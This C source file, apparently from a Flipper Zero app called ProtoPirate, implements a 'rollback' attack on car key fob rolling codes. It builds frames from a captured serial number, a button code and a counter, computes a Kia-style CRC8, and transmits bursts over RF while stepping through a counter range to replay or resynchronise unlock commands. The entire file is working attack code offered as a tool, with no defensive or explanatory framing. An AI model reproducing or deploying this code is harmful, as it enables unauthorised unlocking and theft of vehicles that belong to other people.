#include "protopirate_rb.h"

void rollback_build_frame(
    uint32_t serial,
    uint8_t button,
    uint16_t counter,
    uint32_t* data_hi,
    uint32_t* data_lo) {

    uint32_t frame_serial = (serial & 0x0FFFFFFF) << 12;
    uint16_t frame_btn = (button & 0x0F) << 8;
    uint16_t frame_cnt = counter;

    uint32_t prelim_lo = frame_serial | frame_btn | frame_cnt;

    uint8_t crc_bytes[6] = {0};
    crc_bytes[0] = 0;
    crc_bytes[1] = 0;
    crc_bytes[2] = 0;
    crc_bytes[3] = (prelim_lo >> 24) & 0xFF;
    crc_bytes[4] = (prelim_lo >> 16) & 0xFF;
    crc_bytes[5] = (prelim_lo >> 8) & 0xFF;
    uint8_t crc = kia_crc8(crc_bytes, 6);

    *data_hi = 0;
    *data_lo = frame_serial | frame_btn | frame_cnt | crc;
}

bool rollback_send_single(
    ProtoPirateApp* app,
    uint32_t serial,
    uint8_t button,
    uint16_t counter) {
    uint32_t data_hi, data_lo;
    rollback_build_frame(serial, button, counter, &data_hi, &data_lo);
    return transmit_packet(
        app, data_hi, data_lo, app->frequency, app->rollback.burst_count);
}

bool rollback_attack_run(ProtoPirateApp* app) {
    RollbackState* rs = &app->rollback;
    rs->running = true;

    uint16_t start = rs->base_counter;
    uint16_t end = rs->target_counter;
    uint16_t step = rs->step_size;
    if(step == 0) step = 1;

    int16_t direction = (end > start) ? 1 : -1;
    uint32_t total_steps = abs((int32_t)end - (int32_t)start) / step + 1;
    uint32_t current_step = 0;

    if(!tx_init_hw(app, app->frequency)) {
        rs->running = false;
        return false;
    }

    transmit_start(app, app->frequency);

    for(uint16_t cnt = start;; cnt += direction * step) {
        uint32_t data_hi, data_lo;
        rollback_build_frame(rs->serial, rs->button, cnt, &data_hi, &data_lo);
        transmit_burst(app, data_hi, data_lo);
        furi_delay_ms(30);
        rs->current_counter = cnt;
        current_step++;
        if((direction > 0 && cnt >= end) ||
           (direction < 0 && cnt <= end)) {
            break;
        }
        if(current_step > 65536) break;
    }

    transmit_stop(app);
    rs->running = false;
    return true;
}
